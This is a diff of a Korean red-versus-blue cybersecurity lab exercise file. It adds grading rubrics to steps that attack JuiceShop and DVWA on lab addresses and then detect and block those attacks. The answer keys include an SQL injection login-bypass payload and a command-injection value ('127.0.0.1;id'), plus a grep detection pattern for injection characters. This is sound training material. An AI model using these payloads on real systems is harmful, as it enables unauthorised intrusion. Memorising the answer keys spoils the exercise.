@@ -3,8 +3,8 @@ title: 실전 공방전 1 — Red Phase → Blue Phase → 판정 (라운드 1)
 version: non-ai
 course: battle-nonai
 week: 11
-description: 1세트 인프라에서 Red Phase와 Blue Phase를 번갈아 수행하는 실전 공방전이다. Red Phase에서 web 서버를
-  공격하고, Blue Phase에서 공격을 탐지/차단하며, 최종 판정을 수행한다.
+description: 1세트 인프라에서 Red Phase와 Blue Phase를 번갈아 수행하는 실전 공방전이다. Red Phase에서 web 서버를 공격하고, Blue Phase에서
+  공격을 탐지/차단하며, 최종 판정을 수행한다.
 difficulty: medium
 duration_minutes: 120
 objectives:
@@ -26,28 +26,55 @@ steps:
   category: recon
   points: 10
   answer: nmap -sV -T4 --top-ports 100 --max-retries 1 --host-timeout 15s 10.20.30.80
-  answer_detail: --top-ports 100은 가장 흔한 100개 포트만 스캔하여 시간을 절약한다. 공방전에서는 전체 포트 스캔보다
-    빠른 초기 정찰이 중요하다.
+  answer_detail: --top-ports 100은 가장 흔한 100개 포트만 스캔하여 시간을 절약한다. 공방전에서는 전체 포트 스캔보다 빠른 초기 정찰이 중요하다.
   verify:
     type: output_contains
     expect: open
     field: stdout
+    semantic:
+      intent: '[RED] 빠른 포트 스캔 — nmap -sV -T4 --top-ports 100 -host-timeout 15s. 공방전 시간 제약 → top 100 빠른
+        스캔. 전체 포트보다 속도 우선. 초기 정찰.'
+      success_criteria:
+      - open 키워드
+      - nmap -sV --top-ports 100
+      - 시간 제약 옵션
+      acceptable_methods:
+      - nmap -sV --top-ports
+      - rustscan 빠른 스캔
+      - masscan + nmap
+      negative_signs:
+      - -p- 전체 (느림)
+      - 속도 맥락 없음
+      - 서비스 버전 누락
   target_vm: attacker
 - order: 2
   instruction: '[RED] JuiceShop에 SQL Injection으로 관리자 인증을 우회하라.'
   hint: login API에 SQLi 페이로드를 전송한다.
   category: exploit
   points: 15
-  answer: "\U0001F5A5️ UI: 브라우저에서 http://WEB_IP:3000 접속\n\U0001F4CE 참고 (CLI): curl\
-    \ -s \\\n     -X POST http://10.20.30.80:3000/rest/user/login \\\n     -H 'Content-Type:\
-    \ application/json' \\\n     -d '{\"email\":\"' or 1=1--\",\"password\":\"x\"\
-    }'"
-  answer_detail: JuiceShop의 로그인 API는 email 필드에 SQL Injection이 가능하다. 인증을 우회하면 관리자 토큰을
-    획득한다.
+  answer: "\U0001F5A5️ UI: 브라우저에서 http://WEB_IP:3000 접속\n\U0001F4CE 참고 (CLI): curl -s \\\n     -X POST\
+    \ http://10.20.30.80:3000/rest/user/login \\\n     -H 'Content-Type: application/json' \\\n     -d\
+    \ '{\"email\":\"' or 1=1--\",\"password\":\"x\"}'"
+  answer_detail: JuiceShop의 로그인 API는 email 필드에 SQL Injection이 가능하다. 인증을 우회하면 관리자 토큰을 획득한다.
   verify:
     type: output_contains
     expect: token
     field: stdout
+    semantic:
+      intent: '[RED] SQLi 인증 우회 — POST /rest/user/login + email='' or 1=1--. JWT 토큰 획득. OWASP A03. 첫 Quick
+        Win.'
+      success_criteria:
+      - token 키워드
+      - SQLi 페이로드
+      - POST /rest/user/login
+      acceptable_methods:
+      - curl + SQLi
+      - Burp Repeater
+      - sqlmap --auth
+      negative_signs:
+      - SQLi 없음
+      - 토큰 미획득
+      - 단순 로그인
   target_vm: attacker
 - order: 3
   instruction: '[BLUE] Suricata에서 방금 발생한 공격 알림을 확인하라.'
@@ -55,26 +82,54 @@ steps:
   category: defense
   points: 10
   answer: tail -20 /var/log/suricata/fast.log
-  answer_detail: Suricata fast.log에서 SQL Injection 관련 알림이 발생했는지 확인한다. 소스 IP(10.20.30.201)와
-    시그니처를 확인한다.
+  answer_detail: Suricata fast.log에서 SQL Injection 관련 알림이 발생했는지 확인한다. 소스 IP(10.20.30.201)와 시그니처를 확인한다.
   verify:
     type: output_contains
     expect: 10.20.30
     field: stdout
+    semantic:
+      intent: '[BLUE] Suricata 경보 확인 — tail -20 /var/log/suricata/fast.log. SQL Injection 시그니처 탐지. 10.20.30.201
+        소스 IP. 공방전 실시간 대응. NIDS 탐지.'
+      success_criteria:
+      - tail fast.log
+      - 10.20.30 키워드
+      - 최근 경보
+      acceptable_methods:
+      - tail fast.log
+      - evebox
+      - Dashboard Suricata
+      negative_signs:
+      - fast.log 미확인
+      - 단순 ls
+      - 경보 맥락 없음
   target_vm: secu
 - order: 4
   instruction: '[BLUE] 공격자 IP({{ATTACKER_IP}})를 nftables로 차단하라.'
   hint: blocklist set에 IP를 추가한다.
   category: defense
   points: 15
-  answer: sudo nft add element inet filter blocklist { 10.20.30.201 } 2>/dev/null
-    && nft list ruleset | grep '10.20.30.201' && echo 'Attacker blocked'
-  answer_detail: 공격 IP를 즉시 차단하는 것은 가장 효과적인 방어 조치이다. blocklist set을 사용하면 규칙을 추가하지 않고
-    IP만 추가하여 빠르게 차단한다.
+  answer: sudo nft add element inet filter blocklist { 10.20.30.201 } 2>/dev/null && nft list ruleset
+    | grep '10.20.30.201' && echo 'Attacker blocked'
+  answer_detail: 공격 IP를 즉시 차단하는 것은 가장 효과적인 방어 조치이다. blocklist set을 사용하면 규칙을 추가하지 않고 IP만 추가하여 빠르게 차단한다.
   verify:
     type: output_contains
     expect: Attacker blocked
     field: stdout
+    semantic:
+      intent: '[BLUE] IP 즉시 차단 — nft add element inet filter blocklist {10.20.30.201}. blocklist set =
+        규칙 추가 없이 IP만 추가. 가장 빠른 차단. MITRE D3FEND Network Traffic Filtering.'
+      success_criteria:
+      - Attacker blocked 키워드
+      - nft add element blocklist
+      - 10.20.30.201 IP
+      acceptable_methods:
+      - nft set 추가
+      - iptables -I DROP
+      - ufw deny from IP
+      negative_signs:
+      - set 미사용
+      - 단일 rule 추가 (느림)
+      - IP 차단 맥락 없음
   target_vm: secu
   requires_approval: true
 - order: 5
@@ -82,13 +137,28 @@ steps:
   hint: 차단 여부를 확인한 후 우회 방법을 시도한다.
   category: exploit
   points: 10
-  answer: curl -s --connect-timeout 5 http://10.20.30.80:8080/ && echo 'Access OK'
-    || echo 'Blocked - need alternative approach'
+  answer: curl -s --connect-timeout 5 http://10.20.30.80:8080/ && echo 'Access OK' || echo 'Blocked -
+    need alternative approach'
   answer_detail: IP가 차단되면 직접 접근이 불가능하다. 공격자는 차단 상태를 확인하고, 프록시나 다른 IP를 사용해야 우회할 수 있다.
   verify:
     type: output_contains
     expect: approach
     field: stdout
+    semantic:
+      intent: '[RED] 차단 확인 + 우회 모색 — curl --connect-timeout 5 || echo ''Blocked''. 차단 시 프록시/다른 IP 필요.
+        공방전 적응. MITRE T1090.'
+      success_criteria:
+      - approach 키워드
+      - 차단 확인 후 우회 필요 메시지
+      - --connect-timeout
+      acceptable_methods:
+      - curl + timeout
+      - nc -zv
+      - ping 검증
+      negative_signs:
+      - 검증 없음
+      - 단순 접근 시도
+      - 우회 맥락 없음
   target_vm: attacker
 - order: 6
   instruction: '[BLUE] Suricata 경보를 상세 분석하고, 공격 유형별로 분류하라.'
@@ -97,29 +167,57 @@ steps:
   points: 10
   answer: cat /var/log/suricata/eve.json | jq -r 'select(.event_type=="alert") | "\(.alert.signature)
     from \(.src_ip)"' 2>/dev/null | sort | uniq -c | sort -rn | head -10
-  answer_detail: 경보를 시그니처별로 집계하면 공격 유형의 분포를 파악할 수 있다. SQL Injection, SYN Scan, SSH
-    Brute Force 등이 구분된다.
+  answer_detail: 경보를 시그니처별로 집계하면 공격 유형의 분포를 파악할 수 있다. SQL Injection, SYN Scan, SSH Brute Force 등이 구분된다.
   verify:
     type: output_contains
     expect: 10.20.30
     field: stdout
+    semantic:
+      intent: '[BLUE] 경보 상세 분석 — jq .alert.signature + src_ip + sort | uniq -c | sort -rn. 시그니처별 공격 유형
+        분포. SQLi/SYN Scan/SSH Brute 분류. 공격 패턴 파악.'
+      success_criteria:
+      - 10.20.30 키워드
+      - jq signature + src_ip
+      - 시그니처별 집계
+      acceptable_methods:
+      - jq + 집계
+      - Dashboard signature chart
+      - Splunk stats
+      negative_signs:
+      - signature 미추출
+      - 단일 IP
+      - 공격 분류 없음
   target_vm: secu
 - order: 7
   instruction: '[BLUE] 차단 해제 후, 공격자의 다음 공격에 대비하여 ModSecurity WAF 상태를 확인하라.'
   hint: ModSecurity 설정과 로그를 확인한다.
   category: defense
   points: 10
-  answer: sudo nft delete element inet filter blocklist { 10.20.30.201 } 2>/dev/null
-    && echo 'Block removed for next phase' && sudo apachectl -M 2>/dev/null | grep
-    security || echo 'ModSecurity module check complete'
-  answer_detail: 다음 Red Phase를 위해 차단을 해제한다. ModSecurity WAF가 활성 상태인지 확인하여 웹 공격을 계속
-    방어한다.
+  answer: sudo nft delete element inet filter blocklist { 10.20.30.201 } 2>/dev/null && echo 'Block removed
+    for next phase' && sudo apachectl -M 2>/dev/null | grep security || echo 'ModSecurity module check
+    complete'
+  answer_detail: 다음 Red Phase를 위해 차단을 해제한다. ModSecurity WAF가 활성 상태인지 확인하여 웹 공격을 계속 방어한다.
   verify:
     type: output_contains
     expect:
     - complete
     - ModSecurity
     field: stdout
+    semantic:
+      intent: '[BLUE] 차단 해제 + ModSecurity 확인 — nft delete element + apachectl -M | grep security. 다음 Phase
+        준비. WAF 활성 상태 검증. 2차 방어층 확인.'
+      success_criteria:
+      - complete 또는 ModSecurity 키워드
+      - nft delete + apachectl -M
+      - 2차 방어 검증
+      acceptable_methods:
+      - nft delete + check
+      - systemctl restart apache2
+      - ModSecurity 룰 확인
+      negative_signs:
+      - 차단 해제 없음
+      - WAF 미확인
+      - 다음 Phase 준비 없음
   target_vm: secu
   requires_approval: true
 - order: 8
@@ -127,46 +225,86 @@ steps:
   hint: 세미콜론으로 명령을 연결한다.
   category: exploit
   points: 10
-  answer: "curl -c /tmp/dvwa_cookies.txt \\\n  -d 'username=admin&password=password&Login=Login'\
-    \ http://10.20.30.80:8080/login.php && curl -b /tmp/dvwa_cookies.txt \\\n  -d\
-    \ 'ip=127.0.0.1;id&Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/"
-  answer_detail: Command Injection으로 서버의 사용자 정보(id), 네트워크 설정(ifconfig), 파일 시스템 정보를
-    수집할 수 있다.
+  answer: "curl -c /tmp/dvwa_cookies.txt \\\n  -d 'username=admin&password=password&Login=Login' http://10.20.30.80:8080/login.php\
+    \ && curl -b /tmp/dvwa_cookies.txt \\\n  -d 'ip=127.0.0.1;id&Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/"
+  answer_detail: Command Injection으로 서버의 사용자 정보(id), 네트워크 설정(ifconfig), 파일 시스템 정보를 수집할 수 있다.
   verify:
     type: output_contains
     expect: 127.0.0.1
     field: stdout
+    semantic:
+      intent: '[RED] DVWA CMDi — curl -c + 로그인 + curl -b ''ip=127.0.0.1;id''. 사용자 정보/네트워크 설정/파일시스템 수집.
+        MITRE T1059.004. 2차 공격 벡터.'
+      success_criteria:
+      - 127.0.0.1 키워드
+      - CMDi 세미콜론 주입
+      - 로그인 후 요청
+      acceptable_methods:
+      - curl + ; id
+      - curl + | cat
+      - '&& AND 결합'
+      negative_signs:
+      - CMDi 없음
+      - 로그인 없음
+      - 정보 수집 맥락 없음
   target_vm: attacker
 - order: 9
   instruction: '[BLUE] web 서버의 Apache access.log에서 Command Injection 흔적을 분석하라.'
   hint: 세미콜론, 파이프 등 명령 연결 패턴을 검색한다.
   category: defense
   points: 10
-  answer: grep -E '(;|%3B|%7C|\|)' /var/log/apache2/access.log 2>/dev/null | grep
-    -i exec | tail -10 || echo 'Command injection log analysis complete'
-  answer_detail: Command Injection은 ;(세미콜론), |(파이프) 등의 명령 연결자를 사용한다. URL 인코딩된 형태(%3B,
-    %7C)도 검색해야 한다.
+  answer: grep -E '(;|%3B|%7C|\|)' /var/log/apache2/access.log 2>/dev/null | grep -i exec | tail -10 ||
+    echo 'Command injection log analysis complete'
+  answer_detail: Command Injection은 ;(세미콜론), |(파이프) 등의 명령 연결자를 사용한다. URL 인코딩된 형태(%3B, %7C)도 검색해야 한다.
   verify:
     type: output_contains
     expect: complete
     field: stdout
+    semantic:
+      intent: '[BLUE] Apache CMDi 분석 — grep -E ''(;|%3B|%7C|\|)'' access.log | grep -i exec. 세미콜론/파이프
+        URL 인코딩(%3B/%7C). /exec/ 엔드포인트 대상. CWE-78 탐지.'
+      success_criteria:
+      - complete 키워드
+      - 세미콜론 + 파이프 패턴 검색
+      - access.log 분석
+      acceptable_methods:
+      - grep -E 다중 패턴
+      - ModSecurity CRS 932
+      - Wazuh Apache decoder
+      negative_signs:
+      - 패턴 1개
+      - URL 인코딩 누락
+      - exec 필터 없음
   target_vm: web
 - order: 10
   instruction: '[BLUE] 서비스 가용성을 점검하고, 라운드 1 결과를 정리하라.'
   hint: 모든 서비스가 정상인지 확인하고 보고서를 작성한다.
   category: analysis
   points: 10
-  answer: "\U0001F5A5️ UI: 브라우저에서 http://WEB_IP:3000 접속\n\U0001F4CE 참고 (CLI): curl\
-    \ -so /dev/null \\\n  -w 'Apache:%{http_code} ' http://10.20.30.80/ && curl -so\
-    \ /dev/null \\\n  -w 'JuiceShop:%{http_code} ' http://10.20.30.80:3000/ && curl\
-    \ -so /dev/null \\\n  -w 'DVWA:%{http_code}' http://10.20.30.80:8080/ && echo\
-    \ '\\n=== Round 1 service check complete ==='"
-  answer_detail: 공방전 라운드 종료 시 서비스 가용성을 확인한다. 모든 서비스가 200/302를 반환하면 Blue Phase에서 가용성을
-    유지한 것이다.
+  answer: "\U0001F5A5️ UI: 브라우저에서 http://WEB_IP:3000 접속\n\U0001F4CE 참고 (CLI): curl -so /dev/null \\\n\
+    \  -w 'Apache:%{http_code} ' http://10.20.30.80/ && curl -so /dev/null \\\n  -w 'JuiceShop:%{http_code}\
+    \ ' http://10.20.30.80:3000/ && curl -so /dev/null \\\n  -w 'DVWA:%{http_code}' http://10.20.30.80:8080/\
+    \ && echo '\\n=== Round 1 service check complete ==='"
+  answer_detail: 공방전 라운드 종료 시 서비스 가용성을 확인한다. 모든 서비스가 200/302를 반환하면 Blue Phase에서 가용성을 유지한 것이다.
   verify:
     type: output_contains
     expect: Round 1 service check complete
     field: stdout
+    semantic:
+      intent: '[BLUE] 가용성 점검 — curl -w ''%{http_code}'' × 3 서비스 (Apache/JuiceShop/DVWA). Round 1 종료 가용성
+        검증. Blue Phase 가용성 유지 = 방어 성공. SRE SLO.'
+      success_criteria:
+      - Round 1 service check complete 키워드
+      - 3 서비스 확인
+      - HTTP 코드
+      acceptable_methods:
+      - curl -w
+      - systemctl is-active
+      - 로드밸런서 health check
+      negative_signs:
+      - 서비스 1개만
+      - Round 1 표시 없음
+      - SLO 맥락 없음
   target_vm: secu
 - order: 11
   instruction: 라운드 1 전체 결과를 분석하여 교전 보고서를 작성하라.
@@ -216,4 +354,20 @@ steps:
     type: file_exists
     expect: /tmp/battle_round1_report.txt
     field: filesystem
+    semantic:
+      intent: '교전 보고서 Round 1 — echo > /tmp/battle_round1_report.txt: [RED] 성과 (SQLi/CMDi 성공, SSH 차단)
+        + [BLUE] 성과 (탐지/5분 내 차단/가용성 유지) + [Lessons] Red WAF 우회 필요/Blue 자동 차단 필요/시간 관리. Purple Team 사후
+        분석.'
+      success_criteria:
+      - /tmp/battle_round1_report.txt 파일 생성
+      - RED + BLUE 성과 양측
+      - Lessons Learned
+      acceptable_methods:
+      - echo > 보고서 + 양측
+      - Purple Team AAR
+      - MITRE ATT&CK 매핑
+      negative_signs:
+      - 단측 분석만
+      - Lessons 없음
+      - 체계 부족
   target_vm: attacker
